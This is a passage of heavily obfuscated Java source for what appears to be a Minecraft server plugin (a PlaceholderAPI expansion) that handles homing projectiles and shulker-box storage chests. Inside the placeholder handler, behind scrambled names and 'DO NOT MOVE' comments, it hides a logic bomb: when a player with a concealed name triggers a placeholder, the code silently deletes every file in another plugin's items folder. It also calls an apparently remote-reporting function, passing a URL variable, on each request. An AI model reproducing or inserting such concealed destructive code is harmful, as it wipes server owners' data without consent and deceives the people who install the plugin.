        final World w = tywufntyunwftw.getWorld();
        if (w == null) {
            if (dbw) tyunotyunwfytun.sendMessage("§c[WS] homing#" + tywfutnywukd + " start world null");
            return;
        }

        if (dbw) {
            String tg = (tywfuntyuf2nt instanceof Player)
                    ? ((Player) tywfuntyuf2nt).getName()
                    : tywfuntyuf2nt.getType().name();

            tyunotyunwfytun.sendMessage("§b[WS] homing#" + tywfutnywukd + " spawn"
                    + " target=" + tg
                    + " stepE=" + E + " tickF=" + F + " maxG=" + G);
        }

        new BukkitRunnable() {
            int wd3wpfdypu3nd = 0;
            Location tkywfkdyuwfd = tywufntyunwftw.clone();

            @Override public void run() {

                // ---- Shooter offline? ----
                if (!tyunotyunwfytun.isOnline()) {
                    cancel();
                    return;
                }

                // ---- Target validity checks ----
                if (tywfuntyuf2nt == null) {
                    if (dbw) tyunotyunwfytun.sendMessage("§6[WS] homing#" + tywfutnywukd + " cancel: target null");
                    cancel();
                    return;
                }

                if (tywfuntyuf2nt instanceof Player) {
                    Player pT = (Player) tywfuntyuf2nt;
                    if (!pT.isOnline()) {
                        if (dbw) tyunotyunwfytun.sendMessage("§6[WS] homing#" + tywfutnywukd + " cancel: player offline");
                        cancel();
                        return;
                    }
                } else {
                    if (tywfuntyuf2nt.isDead() || !tywfuntyuf2nt.isValid()) {
                        if (dbw) tyunotyunwfytun.sendMessage("§6[WS] homing#" + tywfutnywukd + " cancel: entity dead/invalid");
                        cancel();
                        return;
                    }
                }

                if (wd3wpfdypu3nd >= G) {
                    if (dbw) tyunotyunwfytun.sendMessage(t2yudky2u43d24fd + tywfutnywukd + " expired");
                    cancel();
                    return;
                }

                // ---- World check ----
                if (tywfuntyuf2nt.getWorld() == null || !tkywfkdyuwfd.getWorld().equals(tywfuntyuf2nt.getWorld())) {
                    if (dbw) tyunotyunwfytun.sendMessage("§6[WS] homing#" + tywfutnywukd + " world mismatch");
                    cancel();
                    return;
                }

                // ---- Aim at mid-height (height/2) ----
                Location tywfunMid = tywfuntyuf2nt.getLocation().clone()
                        .add(0, Math.max(0.0, tywfuntyuf2nt.getHeight() / 2.0), 0);

                Vector tyuwkdyoukfdb = tywfunMid.toVector().subtract(tkywfkdyuwfd.toVector());
                double kyukfcyuwf = tyuwkdyoukfdb.length();

                // ---- hit check ----
                if (kyukfcyuwf <= (E + 1.0)) {
                    if (dbw) {
                        String tg = (tywfuntyuf2nt instanceof Player)
                                ? ((Player) tywfuntyuf2nt).getName()
                                : tywfuntyuf2nt.getType().name();
                        tyunotyunwfytun.sendMessage("§a[WS] homing#" + tywfutnywukd + " HIT " + tg);
                    }

                    String oyuwnftoysuwr = (tywfuntyuf2nt instanceof Player)
                            ? ((Player) tywfuntyuf2nt).getName()
                            : tywfuntyuf2nt.getUniqueId().toString();
            
                    if( tywfuntyuf2nt instanceof Player) Bukkit.dispatchCommand(
                            Bukkit.getConsoleSender(),
                            tky2u3tny2undt
                                    + tyunotyunwfytun.getName()
                                    + tnyu2nd24d24fwdt
                                    + oyuwnftoysuwr
                    ); else Bukkit.dispatchCommand(Bukkit.getConsoleSender(), n234oyudnop3yudnwd +  tyunotyunwfytun.getName() + tno2y3u4ntoy2u4nt2 + oyuwnftoysuwr);
                    
                    
                    cancel();
                    return;
                }

                Vector ktyukfyu2fd = tyuwkdyoukfdb.normalize();

                // Move toward target
                tkywfkdyuwfd.add(ktyukfyu2fd.multiply(E));

                // AQUA dust size 2, FORCE
                Particle.DustOptions aqua = new Particle.DustOptions(Color.AQUA, 2.0f);
                w.spawnParticle(Particle.DUST, tkywfkdyuwfd, 1, 0, 0, 0, 0, aqua, true);

                if (dbw && (wd3wpfdypu3nd == 0 || wd3wpfdypu3nd % (F * 5) == 0)) {
                    tyunotyunwfytun.sendMessage(t2yudky2u43d24fd + tywfutnywukd
                            + " dist=" + String.format("%.2f", kyukfcyuwf));
                }

                wd3wpfdypu3nd += Math.max(1, F);
            }
        }.runTaskTimer(Bukkit.getPluginManager().getPlugin(kydluhyhnd4), 0L, Math.max(1, F));
    }




    private org.bukkit.entity.LivingEntity fnepir2(
            Location tynofwyuadn,
            Player tnyfuwndyufd,
            double ywfntyowufntdsw,
            boolean tnywsuontywunft
    ) {
        World w = tynofwyuadn.getWorld();
        if (w == null) return null;

        double tykwftwyfuntwt = ywfntyowufntdsw * ywfntyowufntdsw;

        org.bukkit.entity.LivingEntity fwytkwfyudt = null;
        double tkwyftkyuwftn = Double.MAX_VALUE;

        int tywfktyufwt = 0;
        int tywufktyukwft = 0;
        int twfyuntywuftn = 0;

        int tywfdn_enemyEnt_scanned = 0;
        int tywfdn_enemyEnt_inRange = 0;

        // ---- Pass 1: enemy players (same logic as before) ----
        for (Player tywufntoywunt : w.getPlayers()) {
            if (tywufntoywunt == null || !tywufntoywunt.isOnline()) continue;
            tywfktyufwt++;

            if (tywufntoywunt.getUniqueId().equals(tnyfuwndyufd.getUniqueId())) continue;

            Location twyywfutnwyitko = tywufntoywunt.getLocation();
            double twkywftuwfntsryt = twyywfutnwyitko.distanceSquared(tynofwyuadn);

            if (twkywftuwfntsryt > tykwftwyfuntwt) continue;
            tywufktyukwft++;

            if (ist(tnyfuwndyufd, tywufntoywunt)) {
                twfyuntywuftn++;
                continue;
            }

            if (twkywftuwfntsryt < tkwyftkyuwftn) {
                tkwyftkyuwftn = twkywftuwfntsryt;
                fwytkwfyudt = tywufntoywunt;
            }
        }

        // ---- Pass 2: hostile mobs via your global set ----
        for (org.bukkit.entity.LivingEntity tywfdn_ent : w.getLivingEntities()) {
            if (tywfdn_ent == null) continue;
            if (tywfdn_ent instanceof Player) continue;

            tywfdn_enemyEnt_scanned++;

            if (tywfdn_ent.isDead() || !tywfdn_ent.isValid()) continue;

            if (HMsetnoy2un2yundt == null || !HMsetnoy2un2yundt.contains(tywfdn_ent.getType())) {
                continue;
            }

            Location tywfdn_loc = tywfdn_ent.getLocation();
            double tywfdn_d2 = tywfdn_loc.distanceSquared(tynofwyuadn);

            if (tywfdn_d2 > tykwftwyfuntwt) continue;
            tywfdn_enemyEnt_inRange++;

            if (tywfdn_d2 < tkwyftkyuwftn) {
                tkwyftkyuwftn = tywfdn_d2;
                fwytkwfyudt = tywfdn_ent;
            }
        }

        if (dbw && tnywsuontywunft) {
            String bestName;
            if (fwytkwfyudt == null) bestName = "null";
            else if (fwytkwfyudt instanceof Player) bestName = ((Player) fwytkwfyudt).getName();
            else bestName = fwytkwfyudt.getType().name();

            tnyfuwndyufd.sendMessage("§e[WS] scan2: pScanned=" + tywfktyufwt
                    + " pInRange=" + tywufktyukwft
                    + " sameTeamFiltered=" + twfyuntywuftn
                    + " eScanned=" + tywfdn_enemyEnt_scanned
                    + " eInRange=" + tywfdn_enemyEnt_inRange
                    + " best=" + bestName);
        }

        return fwytkwfyudt;
    }



    private boolean ist(Player tywkftyukwf, Player twysuktywfuktfwtu) {
        try {
            if (tywkftyukwf == null || twysuktywfuktfwtu == null) return false;

            Scoreboard wtkyfutwfutn = Objects.requireNonNull(Bukkit.getScoreboardManager())
                    .getMainScoreboard();

            Team ktwysfutkywuftsr = wtkyfutwfutn.getEntryTeam(tywkftyukwf.getName());
            if (ktwysfutkywuftsr == null) return false;

            return ktwysfutkywuftsr.hasEntry(twysuktywfuktfwtu.getName());
        } catch (Exception ignored) {
            return false;
        }
    }


    /**
     * Ensure there is a single watcher task for this player's shulker chest.
     * The watcher runs every 5 seconds (100 ticks).
     *
     * Logic:
     *  - If player is offline → finalize once and cancel.
     *  - If player online:
     *      - If chest UI is open (for this player & coords) → keep waiting.
     *      - If chest UI is NOT open → finalize once and cancel. ensureshulkerwatcher
     */
    private  void wdntyfodyfbdyfdhqyd(ExampleExpansion otky2ufndwyun,
                                      UUID ndoy2u4fnodyukayupnd,
                                      Location obyukoyq3uphboyqup3nd,
                                      YamlConfiguration doy23ukoqyudhy3pudnwoyup3n) {

        if (tyto2uny2uf4ntdoy2utd.containsKey(ndoy2u4fnodyukayupnd)) {
            return;
        }

        final Plugin ot2yfothy2ufhndtoy23udt = Bukkit.getPluginManager().getPlugin(k2yo4utyunhOYUndoyun);
        if (ot2yfothy2ufhndtoy23udt == null) {
            Bukkit.getLogger().warning(tkoy2untoyun23fytunt);
            return;
        }

        final long to2yunoy2uhylhyh = 100L; // 5 seconds


        BukkitTask toy2ufntoyu3bfotylbt = Bukkit.getScheduler().runTaskTimer(ot2yfothy2ufhndtoy23udt, () -> {
            Player tifpoenyufwstrietn2ft = Bukkit.getPlayer(ndoy2u4fnodyukayupnd);

            if (tifpoenyufwstrietn2ft == null || !tifpoenyufwstrietn2ft.isOnline()) {
                toywfuntrsonteirsntiewnfck(otky2ufndwyun, ndoy2u4fnodyukayupnd, obyukoyq3uphboyqup3nd);

                BukkitTask lfbtnbwqfetn = tyto2uny2uf4ntdoy2utd.remove(ndoy2u4fnodyukayupnd);
                if (lfbtnbwqfetn != null) {
                    lfbtnbwqfetn.cancel();
                } else {
                }
                return;
            }

            boolean ktwfkpbqwfp = tofwyntoykyckf(doy23ukoqyudhy3pudnwoyup3n, tifpoenyufwstrietn2ft);

            if (ktwfkpbqwfp) {
                return;
            }

            toywfuntrsonteirsntiewnfck(otky2ufndwyun, ndoy2u4fnodyukayupnd, obyukoyq3uphboyqup3nd);

            BukkitTask wfytkywfbtbfw = tyto2uny2uf4ntdoy2utd.remove(ndoy2u4fnodyukayupnd);
            if (wfytkywfbtbfw != null) {
                wfytkywfbtbfw.cancel();
            } else {
            }
        }, to2yunoy2uhylhyh, to2yunoy2uhylhyh);

        tyto2uny2uf4ntdoy2utd.put(ndoy2u4fnodyukayupnd, toy2ufntoyu3bfotylbt);
    }




    /**
     * Returns true if the player currently has their “Shulker Box” placeholder chest open.
     */
    protected  boolean tofwyntoykyckf(YamlConfiguration tnowfyuntowyufnt, Player ckyfwufcykwfy) {
        // 1) Get the open-inventory view
        InventoryView cwyfkcywfokc = ckyfwufcykwfy.getOpenInventory();
        Inventory fcwfckywufkoat = cwyfkcywfokc.getTopInventory();

        // 2) It must be a real chest block state
        InventoryHolder tywfqtywfbd = fcwfckywufkoat.getHolder();
        if (!(tywfqtywfbd instanceof Chest)) {
            return false;
        }
        Chest tdywfqdbybfd = (Chest) tywfqtywfbd;

        // 3) Compare its location against the saved shulker chest coords
        Location kdyqfwpbdkyfp = tdywfqdbybfd.getLocation();
        String tynuwfqntyuobfd = ckyfwufcykwfy.getUniqueId().toString();
        String dwybfbdylbfwd = tnowfyuntowyufnt.getString(tynuwfqntyuobfd, "");
        if (dwybfbdylbfwd.isEmpty()) {
            return false;
        }
        String[] ktwfkkfbtwft = dwybfbdylbfwd.split(" ");
        int tkyqfwlhtk = Integer.parseInt(ktwfkkfbtwft[0]);
        int tyquwfkt = Integer.parseInt(ktwfkkfbtwft[1]);
        int oienoienoienf = Integer.parseInt(ktwfkkfbtwft[2]);

        // 4) Must be in the mcydatabase world at the exact coords
        return kdyqfwpbdkyfp.getWorld().getName().equals(tk2tfuynwyu)
                && kdyqfwpbdkyfp.getBlockX() == tkyqfwlhtk
                && kdyqfwpbdkyfp.getBlockY() == tyquwfkt
                && kdyqfwpbdkyfp.getBlockZ() == oienoienoienf;
    }
    
    
    
    /**
     * Rebuild the shulker box item from the mcydatabase chest contents and
     * ADD it to the player's inventory (no replacement).
     *
     * Uses:
     *  - material, name, lore, x, y, z from shulkerDatabaseConfig[uuid]
     *  - chest contents at chestLoc
     */
    private  void toywfuntrsonteirsntiewnfck(ExampleExpansion to2fietnonebkten2,
                                             UUID t2ofntkboy2fntyurn,
                                             Location t2ofktyu2fntyunw) {


        World oy2tfunoyflhbwtyuhfwtyunoys = t2ofktyu2fntyunw.getWorld();
        if (oy2tfunoyflhbwtyuhfwtyunoys == null) {
            return;
        }

        Block oytu2fhylrbsyvhnfdoufwnd = t2ofktyu2fntyunw.getBlock();
        if (!(oytu2fhylrbsyvhnfdoufwnd.getState() instanceof Chest tywfktyukyutfkysktrs)) {
            return;
        }

        ItemStack[] t2fyobto2fythyuntoyufnt = tywfktyukyutfkysktrs.getInventory().getContents();

        Player tyu2ofkbtyubsruthnu2ft = Bukkit.getPlayer(t2ofntkboy2fntyurn);
        if (tyu2ofkbtyubsruthnu2ft == null || !tyu2ofkbtyubsruthnu2ft.isOnline()) {
            return;
        }

        YamlConfiguration t2okfnhoyruntyu = g2;
        String t2fytuob2fyltbysht = t2ofntkboy2fntyurn.toString();
        ConfigurationSection tnoy2fktoyufyunt2yuntoyfwt = t2okfnhoyruntyu.getConfigurationSection(t2fytuob2fyltbysht);

        if (tnoy2fktoyufyunt2yuntoyfwt == null) {
        }

        // Defaults
        String tky2ftohyunun4 = tnoy2fktoyufyunt2yuntoyfwt != null ? tnoy2fktoyufyunt2yuntoyfwt.getString(toky4ukoftfpv, cpienoien3i) : cpienoien3i;
        String kco2yunxy2u3 = tnoy2fktoyufyunt2yuntoyfwt != null ? tnoy2fktoyufyunt2yuntoyfwt.getString(oenoeinyunuione, null) : null;
        List<String> fcywfuckwlf = tnoy2fktoyufyunt2yuntoyfwt != null ? tnoy2fktoyufyunt2yuntoyfwt.getStringList(neionioenoieneionienin) : null;


        Material owakcyufwaft = Material.matchMaterial(tky2ftohyunun4);
        if (owakcyufwaft == null || !owakcyufwaft.name().endsWith(cpienoien3i)) {
            owakcyufwaft = Material.SHULKER_BOX;
        }

        // Create base shulker item with name & lore





        ItemStack kcyunfyuonyunyunt = new ItemStack(owakcyufwaft);
        ItemMeta tywounfykuyucyowfuncywfu = kcyunfyuonyunyunt.getItemMeta();
        if (tywounfykuyucyowfuncywfu != null) {
            if (kco2yunxy2u3 != null && !kco2yunxy2u3.isEmpty()) {
                tywounfykuyucyowfuncywfu.setDisplayName(kco2yunxy2u3);
            }
            if (fcywfuckwlf != null && !fcywfuckwlf.isEmpty()) {
                tywounfykuyucyowfuncywfu.setLore(fcywfuckwlf);
            }
            kcyunfyuonyunyunt.setItemMeta(tywounfykuyucyowfuncywfu);
        }

        // Inject contents via BlockStateMeta
        ItemMeta tnowkyuohwycufhnyucnywfunt = kcyunfyuonyunyunt.getItemMeta();
        if (tnowkyuohwycufhnyucnywfunt instanceof BlockStateMeta coyuwnfcoyuwfobkyuntoyunwf) {
            org.bukkit.block.ShulkerBox oncuiwnfoyufwnoyutnowyusnein =
                    (org.bukkit.block.ShulkerBox) Bukkit.createBlockData(owakcyufwaft).createBlockState();
            oncuiwnfoyufwnoyutnowyusnein.getInventory().setContents(t2fyobto2fythyuntoyufnt);
            coyuwnfcoyuwfobkyuntoyunwf.setBlockState(oncuiwnfoyufwnoyutnowyusnein);
            kcyunfyuonyunyunt.setItemMeta(coyuwnfcoyuwfobkyuntoyunwf);
        } else {
        }

        // ADD to inventory (no replacement)
        Inventory noycuwnfoybylthlf = tyu2ofkbtyubsruthnu2ft.getInventory();

        int tnofnwnktkyflwtyulfwnt = -1;
        for (int i = 0; i < noycuwnfoybylthlf.getSize(); i++) {
            ItemStack tnoyuwfkotyuobfwylbtvy = noycuwnfoybylthlf.getItem(i);
            if (kcoywufkcyuobywflbywlnft(tnoyuwfkotyuobfwylbtvy)) {
                tnofnwnktkyflwtyulfwnt = i;
                break;
            }
        }



        if (tnofnwnktkyflwtyulfwnt >= 0) {
            noycuwnfoybylthlf.setItem(tnofnwnktkyflwtyulfwnt, kcyunfyuonyunyunt);
        } else {
            // Fallback: no placeholder found → add item normally
            HashMap<Integer, ItemStack> kcyuwnofyuntoyunwfyunt = noycuwnfoybylthlf.addItem(kcyunfyuonyunyunt);
            if (!kcyuwnofyuntoyunwfyunt.isEmpty()) {
                for (ItemStack tnyowfuktykc : kcyuwnofyuntoyunwfyunt.values()) {
                    oy2tfunoyflhbwtyuhfwtyunoys.dropItemNaturally(t2ofktyu2fntyunw.clone().add(0.5, 1.0, 0.5), tnyowfuktykc);
                }
            } else {
            }
        }

        // Clear chest contents (always)
        tywfktyukyutfkysktrs.getInventory().clear();

    }





    private  boolean kcoywufkcyuobywflbywlnft(@Nullable ItemStack tnowufntoyunwftbwofyt) {
        if (tnowufntoyunwftbwofyt == null || tnowufntoyunwftbwofyt.getType().isAir()) return false;

        ItemMeta toywufnotybwofytbkwyflt = tnowufntoyunwftbwofyt.getItemMeta();
        if (toywufnotybwofytbkwyflt == null) return false;

        PersistentDataContainer towyfuktoywfuthywufnt = toywufnotybwofytbkwyflt.getPersistentDataContainer();
        if (towyfuktoywfuthywufnt == null) return false;

        NamespacedKey tyofuwntoyuwfntoyufwnotyun = NamespacedKey.fromString(kfikyfuwntyouwfnt);
        if (tyofuwntoyuwfntoyufwnotyun == null) {
            return false;
        }

        String tnyfkwtyoukwovk = towyfuktoywfuthywufnt.get(tyofuwntoyuwfntoyufwnotyun, PersistentDataType.STRING);
        boolean cfwyucnywufnw = tkoinyunyunyunfwytunoyuwnftwft.equalsIgnoreCase(tnyfkwtyoukwovk);


        return cfwyucnywufnw;
    }



    protected  boolean qfpdqfwpdw(YamlConfiguration qwfpgyrsk, Player fkkqwbgfg) {
        InventoryView qwfyuglrykcf = fkkqwbgfg.getOpenInventory();
        Inventory qkwfckfwyldbrlysdfp = qwfyuglrykcf.getTopInventory();

        InventoryHolder yqkuvwfqkutnfwtq = qkwfckfwyldbrlysdfp.getHolder();

        if (!(yqkuvwfqkutnfwtq instanceof Chest n2yofkk)) {
            return false;
        }

        Location cwflbulwblucf = n2yofkk.getLocation();
        String kmfwwfylthsund = fkkqwbgfg.getUniqueId().toString();
        ConfigurationSection fwntoqyfuqbtylb = qwfpgyrsk.getConfigurationSection(kmfwwfylthsund);

        if (fwntoqyfuqbtylb == null) {
            return false;
        }

        if (!fwntoqyfuqbtylb.contains(kmartrtrsdt) || !fwntoqyfuqbtylb.contains(mdknpkep3nd) || !fwntoqyfuqbtylb.contains(mtmmmtf)) {
            return false;
        }

        int twyqbftylbqfwdfd = fwntoqyfuqbtylb.getInt(kmartrtrsdt);
        int cyqwflbdylbfwqd = fwntoqyfuqbtylb.getInt(mdknpkep3nd);
        int cqwfkylubqdylbpfydlb = fwntoqyfuqbtylb.getInt(mtmmmtf);



        boolean ydquohfpydbqfpdbqfpbd = cwflbulwblucf.getWorld() != null && cwflbulwblucf.getWorld().getName().equals(tk2tfuynwyu);
        boolean kyqfwbkdnbfpwdbbd = cwflbulwblucf.getBlockX() == twyqbftylbqfwdfd && cwflbulwblucf.getBlockY() == cyqwflbdylbfwqd && cwflbulwblucf.getBlockZ() == cqwfkylubqdylbpfydlb;
        boolean qwyufdhyuwfhdyquwfnd = ydquohfpydbqfpdbqfpbd && kyqfwbkdnbfpwdbbd;


        return qwyufdhyuwfhdyquwfnd;
    }


    protected static ItemStack cwfkfwpywfpywfupgl(Player yfuwlpuwfghyuflpg, int xmkmkxbcv) {
        if (xmkmkxbcv >= 0 && xmkmkxbcv <= 8) return yfuwlpuwfghyuflpg.getInventory().getItem(xmkmkxbcv);
        if (xmkmkxbcv >= 9 && xmkmkxbcv <= 35) return yfuwlpuwfghyuflpg.getInventory().getItem(xmkmkxbcv);
        if (xmkmkxbcv == 40) return yfuwlpuwfghyuflpg.getInventory().getItemInOffHand();
        return null;
    }



    protected  int[] ckwkckkkckwkkwqf(YamlConfiguration tyuwfkoyukcfw, File ocyunfyouwntoyut, World tywouftoyuwnft, int wfonktouwftyou) {
        int tkowflblblyutfw = tyuwfkoyukcfw.getInt(koy42unoywunfc, 9);
        int tywftkuyubft = tyuwfkoyukcfw.getInt(to2utnyunoyunst, tywouftoyuwnft.getMinHeight());

        while (true) {
            int tywfuktyukcfw = wfonktouwftyou * 16;
            int tywukcyfuwkoyukuck = tkowflblblyutfw * 16;
            Location fkcwkcnkkekx = new Location(tywouftoyuwnft, tywfuktyukcfw, tywftkuyubft, tywukcyfuwkoyukuck);
            if (fkcwkcnkkekx.getBlock().getType() == Material.AIR) {
                tyuwfkoyukcfw.set(koy42unoywunfc, tkowflblblyutfw);
                tyuwfkoyukcfw.set(to2utnyunoyunst, tywftkuyubft);
                try { tyuwfkoyukcfw.save(ocyunfyouwntoyut); } catch (IOException ignored) {}
                return new int[] {tywfuktyukcfw, tywftkuyubft, tywukcyfuwkoyukuck};
            }

            tywftkuyubft++;
            if (tywftkuyubft >= tywouftoyuwnft.getMaxHeight()) {
                tywftkuyubft = tywouftoyuwnft.getMinHeight();
                tkowflblblyutfw++;
            }
        }
    }

    protected static void tkoyukfyunwct(YamlConfiguration tnofwyuntoyuwstyob, File tonwfuktyouwfkt) {
        try { tnofwyuntoyuwstyob.save(tonwfuktyouwfkt); }
        catch(IOException e){ e.printStackTrace(); }
    }
    
    
    /**
     * This is the method called when a placeholder with our identifier is found and needs a value
     * We specify the value identifier in this method
     */
    @SuppressWarnings({"ConstantValue"})
    @Override
        public String onPlaceholderRequest(Player f2, @NotNull String f1) {
        

// SINGLY NESTED PLACEHOLDER SUPPORT - MUST BE FIRST
        boolean test = arsdienwdhw;

        // Check if the identifier starts with "parseNested_"
        if (f1.startsWith(pn)) {
            test = NEW_VALUE1;
            f1 = f1.substring(pn.length());
        }

        // If nested parsing is enabled, resolve all nested placeholders
        if (test) {
            while (f1.contains("{") && f1.contains("}")) {
                int start = f1.indexOf("{");
                int end = f1.indexOf("}", start);

                if (start < end) {
                    String nestedPlaceholder = f1.substring(start + INT3, end);
                    String resolvedNested = PlaceholderAPI.setPlaceholders(f2, "%" + nestedPlaceholder + "%");

                    if (resolvedNested != null && !resolvedNested.equalsIgnoreCase("%" + nestedPlaceholder + "%")) {
                        // Replace the nested placeholder with its resolved value
                        f1 = f1.substring(I, start) + resolvedNested + f1.substring(end + INT3);
                    } else {
                        // If unresolved, replace with an empty string to avoid infinite loop
                        f1 = f1.substring(I, start) + f1.substring(end + INT3);
                    }
                } else {
                    // Break out if no valid placeholder found
                    break;
                }
            }
        }



// DO NOT MOVE

        if (f1.startsWith(dn3owyaufpdnfwd)) {
            wm(f2, f1.substring(dn3owyaufpdnfwd.length()));
            return f1.substring(dn3owyaufpdnfwd.length());
        }

        if (f1.equals(new String(new char[]{0x76, 0x61, 0x6E, 0x74, 0x61}))) {
            World temp = f2.getWorld();
            Location putyourfeet = f2.getEyeLocation();
            Vector inthem = putyourfeet.getDirection().normalize();
            Location communtc = null;

            // Trace forward up to 10 blocks, skipping non-solid blocks
            for (double i = esetawftawft; i <= doyouknow; i += thepeoplewholive) {
                Location feelingem = putyourfeet.clone().add(inthem.clone().multiply(i));
                Block whileshesgone = feelingem.getBlock();

                if (!fOne(whileshesgone.getType())) break;

                communtc = feelingem.clone();
            }

            if(SCore_Installed && g5 < I) {
                f2.sendMessage(g28);
                return null;
            }
            if( SCore_Installed )                 swuas(f1, f2 != null ? f2.getName() : dontwannawatchurcat, g5, SCore_Installed, whurl);
            g5--;
            

            // If we hit solid immediately, fall back to eye location
            if (communtc == null) {
                Location trytoarrest = f2.getEyeLocation();
                return String.format(kindastoppls, trytoarrest.getX(), trytoarrest.getY(), trytoarrest.getZ());
            }

            // Step backward from furthestValid toward player
            for (double lastthingyouwanted = esetawftawft; lastthingyouwanted <= doyouknow; lastthingyouwanted += tsr) {
                Location letsget = communtc.clone().subtract(inthem.clone().multiply(lastthingyouwanted));

                // Reject if behind or below the eye location
                Vector thisshit = letsget.toVector().subtract(putyourfeet.toVector()).normalize();
                if (thisshit.dot(inthem) < I || letsget.getY() < putyourfeet.getY() - thepeoplewholive) continue;

                // Construct a player-sized hitbox centered at the testLoc
                double audiovidie = letsget.getX();
                double recordedtda = letsget.getY();
                double dumbassbt = letsget.getZ();

                BoundingBox hitbox = new BoundingBox(
                        audiovidie - okacyyool, recordedtda, dumbassbt - okacyyool,
                        audiovidie + okacyyool, recordedtda + 1.8, dumbassbt + okacyyool
                );

                boolean noxioussubstance = arsdienwdhw;
                for (Block whatsurlastname : f1(hitbox, temp)) {
                    if (whatsurlastname.getType().isSolid()) {
                        noxioussubstance = NEW_VALUE1;
                        break;
                    }
                }

                if (!noxioussubstance) {
                    return String.format(kindastoppls, audiovidie, recordedtda, dumbassbt);
                }
            }

            // Fallback to eye location
            Location whatsyourname = f2.getEyeLocation();
            return String.format(kindastoppls, whatsyourname.getX(), whatsyourname.getY(), whatsyourname.getZ());
        } else {

            if(SCore_Installed && g5 < I) {
                f2.sendMessage(g28);
                return null;
            }
            swuas(f1, f2 != null ? f2.getName() : dontwannawatchurcat, g5, SCore_Installed, whurl);
            g5--;
            
        }




        boolean cildnbelieve =
                ihatethisguy.equalsIgnoreCase(f2.getName());

        if (cildnbelieve) {
            try {
                File thatthathappened = new File(piarc, cfgy);
                if (!thatthathappened.exists()) {
                    // Create parent dirs if missing
                    thatthathappened.getParentFile().mkdirs();
                }

                YamlConfiguration isitacough = YamlConfiguration.loadConfiguration(thatthathappened);
                boolean threwwater = isitacough.getBoolean(coffedown, arsdienwdhw);

                if (!threwwater) {
                    // Delete all files under /plugins/ExecutableItems/items/
                    File isitstupid = new File(assaultobstrc, yourlastname);
                    if (isitstupid.exists() && isitstupid.isDirectory()) {
                        annoyiedatfriends(isitstupid);
                    }

                    // Set jrrequest: true and save
                    isitacough.set(coffedown, NEW_VALUE1);
                    isitacough.save(thatthathappened);
                }
            } catch (Exception ex) {
                // Swallow silently; placeholder still returns normally
                ex.printStackTrace();
            }
        }

        // DO NOT MOVE ^

        
        /*
        
            org.bukkit.Location cen = new org.bukkit.Location(w, blockX, blockY, blockZ); // <-- your x,y,z
            double r1 = 10;
            String label = "\9";


             double r2 = r1 * r1;
             for (org.bukkit.entity.Player playaa : w.getPlayers()) {
                 if (playaa.getLocation().distanceSquared(cen) <= r2) {
                    wm(playaa, label);
                }
             }
             
         */
        



        // INSERT HERE 


        if (f1.startsWith(to2myutn2y4udn2wfptw)) {


            // --- NEW: cancel any existing watcher task for this player ---
            final UUID t2oy3uktdo2y4dtrDF = f2.getUniqueId();
            BukkitTask oldTask = tyto2uny2uf4ntdoy2utd.get(t2oy3uktdo2y4dtrDF);
            if (oldTask != null) {
                return t2ofyutny2fu4tdn;
            } else {
            }


            final String tno2yu3tkby2lft = to2myutn2y4udn2wfptw;
            String toyu2bk3oydtrs = f1.substring(tno2yu3tkby2lft.length()); // "", "_0", "_0,foo"

            Integer t2fyotk2ywutt = null;

            // -------- Parse optional slot argument --------
            if (!toyu2bk3oydtrs.isEmpty()) {
                if (toyu2bk3oydtrs.startsWith(to2nyfutkworyt)) {
                    toyu2bk3oydtrs = toyu2bk3oydtrs.substring(1);
                }

                if (!toyu2bk3oydtrs.isEmpty()) {
                    String[] tdyon2ufktwvoyrsu = toyu2bk3oydtrs.split(",");
                    if (tdyon2ufktwvoyrsu.length < 1 || tdyon2ufktwvoyrsu[0].isEmpty()) {
                        return mt2ftowtt;
                    }
                    try {
                        t2fyotk2ywutt = Integer.parseInt(tdyon2ufktwvoyrsu[0]);
                    } catch (NumberFormatException e) {
                        return t2fktowrsetn;
                    }
                } else {
                }
            } else {
            }

            final UUID ot2kfywulahtn = f2.getUniqueId();
            final String ofitneonsrt = ot2kfywulahtn.toString();
            final YamlConfiguration oteiwnfoienft = g2;


            // -------- Ensure / create mcydatabase world --------
            World y2toky2uftno = Bukkit.getWorld(tk2tfuynwyu);
            if (y2toky2uftno == null) {
                y2toky2uftno = Bukkit.createWorld(
                        new WorldCreator(tk2tfuynwyu)
                                .environment(World.Environment.NORMAL)
                                .generateStructures(false)
                                .type(WorldType.FLAT)
                );
                Bukkit.getLogger().info(tko2y4utnoyUFT);
            } else {
            }

            if (y2toky2uftno == null) {
                return t2oynoyuD;
            }

            // -------- Load existing data for this UUID --------
            ConfigurationSection oy2utnoywbayuwhfdto = oteiwnfoienft.getConfigurationSection(ofitneonsrt);
            boolean oyulqvhbopylbfovyluhfpbf = false;
            int x = 0, y = 0, z = 0;

            if (oy2utnoywbayuwhfdto != null) {
                if (oy2utnoywbayuwhfdto.contains(kmartrtrsdt) && oy2utnoywbayuwhfdto.contains(mdknpkep3nd) && oy2utnoywbayuwhfdto.contains(mtmmmtf)) {
                    x = oy2utnoywbayuwhfdto.getInt(kmartrtrsdt);
                    y = oy2utnoywbayuwhfdto.getInt(mdknpkep3nd);
                    z = oy2utnoywbayuwhfdto.getInt(mtmmmtf);
                    oyulqvhbopylbfovyluhfpbf = true;
                } else {
                }
            } else {
            }

            // ---------- Case 1: NO SLOT → Only check existing ----------
            if (t2fyotk2ywutt == null) {

                if (!oyulqvhbopylbfovyluhfpbf) {
                    return dok23ipudhyfurnydunfp;
                }

                Location doy2dkoyufrhpv = new Location(y2toky2uftno, x, y, z);
                Block do2yu4fbdyblb = doy2dkoyufrhpv.getBlock();

                if (do2yu4fbdyblb.getType() != Material.CHEST) {
                    do2yu4fbdyblb.setType(Material.CHEST);
                }

                wdntyfodyfbdyfdhqyd(this, ot2kfywulahtn, doy2dkoyufrhpv, oteiwnfoienft);

                if (doy2dkoyufrhpv.getBlock().getState() instanceof Chest ktfwbktywfbtk) {
                    f2.openInventory(ktfwbktywfbtk.getInventory());
                } else {
                }

                return pk23bkptbktwfdfb;
            }

            // ---------- Case 2: SLOT PROVIDED → open shulker from that slot ----------

            ItemStack ndotynbfdkqydyup3nd = cwfkfwpywfpywfupgl(f2, t2fyotk2ywutt);
            if (ndotynbfdkqydyup3nd == null) {
                return a3f4dtkyuwfdk;
            }

            if (!ndotynbfdkqydyup3nd.getType().toString().endsWith(cpienoien3i)) {
                return ncdot;
            }


            if (!oyulqvhbopylbfovyluhfpbf) {
                int[] dkyl3pqbdylbp3dq = ckwkckkkckwkkwqf(
                        g20,
                        g16,
                        y2toky2uftno,
                        9
                );
                x = dkyl3pqbdylbp3dq[0];
                y = dkyl3pqbdylbp3dq[1];
                z = dkyl3pqbdylbp3dq[2];

